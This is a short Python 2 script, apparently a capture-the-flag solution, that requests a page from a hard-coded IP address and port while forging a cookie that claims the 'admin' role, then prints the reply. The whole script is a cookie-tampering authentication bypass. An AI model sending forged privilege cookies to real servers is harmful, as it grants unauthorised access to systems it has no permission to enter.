#! /usr/bin/env python

import requests 

r = requests.get('http://34.216.132.109:8084/', cookies={'Who are you?':'admin'})  


print r.text



